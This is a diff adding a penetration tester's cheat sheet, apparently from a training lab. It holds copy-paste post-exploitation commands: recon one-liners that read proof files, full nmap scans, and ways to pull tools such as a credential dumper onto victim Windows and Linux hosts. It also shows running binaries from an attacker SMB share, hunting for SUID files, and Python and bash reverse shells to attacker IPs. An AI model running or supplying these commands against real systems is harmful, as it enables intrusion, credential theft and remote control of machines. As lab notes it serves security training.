@@ -1,0 +1,188 @@
+-----------------------------------------
+Windows Post Exploit Gather Intelligence
+-----------------------------------------
+echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: & type "C:\Users\Administrator\Desktop\proof.txt" 2> nul & type "C:\Documents and Settings\Administrator\Desktop\proof.txt" 2> nul & type %USERPROFILE%\Desktop\proof.txt 2> nul
+
+--------------------------------------
+Linux Post Exploit Gather Intelligence
+--------------------------------------
+echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null;echo " "
+
+------------------------
+General TCP Port Scan
+------------------------
+sudo nmap -vv -Pn -A -sC -sS -T 4 -p- -oN '/home/freemandyson/Projects/pentesting_tools/scans/<IP>.nmap' -oX '/home/freemandyson/Projects/pentesting_tools/scans/<IP>_nmap_scan_import.xml' <IP>
+
+sudo nmap -vv -Pn -A -sC -sS -T 4 -p- <IP> > share/<IP>.nmap
+
+-------------------------
+General UDP Port Scan
+-------------------------
+sudo nmap -vv -Pn -A -sC -sU -T 4 --top-ports 1000 -oN '/home/freemandyson/Projects/pentesting_tools/scans/<IP>U.nmap' -oX '/home/freemandyson/Projects/pentesting_tools/scans/<IP>U_nmap_scan_import.xml' <IP>
+
+sudo nmap -vv -Pn -A -sC -sU -T 4 --top-ports 1000 <IP> > <IP>U.nmap
+
+-------------------------------
+File Transfer VB for Windows
+-------------------------------
+Either echo or write into 'file_transfer.vb' file:
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", "http://10.11.0.51/test.txt", False
+xHttp.Send
+
+with bStrm
+    .type = 1 '//binary
+    .open
+    .write xHttp.responseBody
+    .savetofile "c:\temp\xxx.png", 2 '//overwrite
+end with
+
+** Run Script: C:\users\marcoc> cscript file_transfer.vb
+
+------------------------------------------
+File Transfer With Powershell Windows
+------------------------------------------
+** Open 'powershell.exe' (typically) located here: 	
+	# C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+
+** Script:
+$url = "http://10.11.0.51/test.txt"    // Location of Web Server
+$output = "C:\users\marcoc\Desktop\about.txt"                      // Location on local machine and decided name of file
+(New-Object System.Net.WebClient).DownloadFile($url, $output)  // Web Request
+
+** One liner you can echo into a '.ps1' file:
+$url = "http://10.11.0.51/test.txt"; $output = "C:\Users\Bethany\temp\test.txt"; (New-Object System.Net.WebClient).DownloadFile($url, $output) 
+
+** Run a powershell file from 'cmd.exe':
+powershell -noexit "& ""C:\must\put\entire\path\to\script.ps1"""
+
+** Run Without the Script (untested):
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.51/test.txt','C:\Users\path\to\folder\with\correct\permissions')"
+
+--------------------------
+Windows FTP File Transfer
+-------------------------
+** Password has a space when using shovel command BE AWARE.
+echo OPEN 10.11.0.51 > f.txt
+echo USER ftpuser >> f.txt
+echo resuptf >> f.txt
+echo GET wce32.exe >> f.txt
+echo BYE >> f.txt
+
+------------------------
+Linux FTP File Transfer
+------------------------
+** Password has a space when using shovel command BE AWARE.
+echo OPEN 10.11.0.51 > f.txt
+echo USER ftpuser >> f.txt
+echo resuptf >> f.txt
+echo bin >> f.txt
+echo GET <filename> >> f.txt
+echo bye >> f.txt
+
+----------------------------------
+FTP file transfer with Metasploit
+----------------------------------
+* Module: auxiliary/server/ftp
+* set FTPROOT /tmp/ftp/
+* exploit
+* On remote machine paste the following:
+
+	# echo open 10.11.0.208>ftp_commands.txt&echo anonymous>>ftp_commands.txt&echo password>>ftp_commands.txt&echo binary>>ftp_commands.txt&echo put test.txt>>ftp_commands.txt&echo bye>>ftp_commands.txt&ftp -s:ftp_commands.txt
+
+------------------------------------
+TFTP file transfer with Metasploit
+------------------------------------
+* Module: auxiliary/server/tftp
+* set TFTPROOT /tmp/ftp
+* exploit
+* On remote machine paste the following:
+	# tftp -i 10.11.0.51 GET test.txt
+		** By default the PUT method will save files to '/tmp'
+		** You can change this by:	set OUTPUTPATH '/wherever/you/want'
+** NOTE: You may be able to install tftp on remote machine if its not present: 
+	# pkgmgr /iu:"TFTP"  
+
+------------------------------------
+File Transfer with SMB for Windows
+------------------------------------
+* Local Machine:
+	# sudo smbserver.py ROPNOP /root/shells
+		** Verify it's working: sudo smbclient -L 10.11.0.51 --no-pass
+* Remote Windows Machine:
+	# dir \\10.11.0.51\ROPNOP				# shows what files are in attacker SMB share
+	# copy \\10.11.0.51\ROPNOP\test.txt .	# copies files to victim
+	# \\10.11.0.51\whatever.exe				# runs files on victim machine w/o copying
+
+-------------------
+File Transfer Perl
+-------------------
+﻿perl -e 'use LWP::Simple; getstore("http://textfiles.com/100/actung.hum", "actung.hum");'
+
+---------------------
+File Transfer Python
+---------------------
+python -c "import urllib; print urllib.urlopen('http://textfiles.com/100/actung.hum').read()" > file.txt
+
+---------------------------------
+File Transfer Python HTTP Server
+---------------------------------
+** Navigate to directory you want on the server then type the following:
+python -m SimpleHTTPServer 
+
+-------------------
+File Transfer SSH
+-------------------
+** Remote to Local
+scp your_username@remotehost.edu:/some/remote/directory /some/local/directory
+
+** Local to Remote
+scp foobar.txt your_username@remotehost.edu:/some/remote/directory
+
+----------------------------------------------------------
+Post Exploit Search Windows Directory/File Grep Equivalent
+----------------------------------------------------------
+dir /s | findstr -ir "<file or dir name>"
+
+-----------------------------------------------------------------
+Post Exploit Windows Find Directories and Files Of Specific User
+-----------------------------------------------------------------
+dir C:\*.* /S /Q|FIND /i "marcoc" > C:\path\to\outpu\file.txt
+
+------------------------------------------------------------------------
+Post Exploit Linux Find Directories and Files of Specific User or Group
+------------------------------------------------------------------------
+* find /home -group ftpusers
+* find /data/project -group ftpusers -name "*.c"
+
+* find /var -user marco
+* find /var/www -user marco -name "*.pl"
+
+---------------------------------------------
+Post Exploit SUID or SGID File Search Linux 
+---------------------------------------------
+ls -l $(find / -perm -g=s -o -perm -u=s -type f 2>/dev/null)
+
+--------------------------------------
+Forensic Tools for Post Exploit Linux
+--------------------------------------
+find / -mmin 2
+	# Locates any files that have been changed within last two minutes
+
+	
+---------------
+Spawn TTY Shell
+---------------
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+--------------------------
+Reverse Python Shell
+--------------------------
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.208",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+--------------------------
+Reverse Bash Shell
+--------------------------											
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
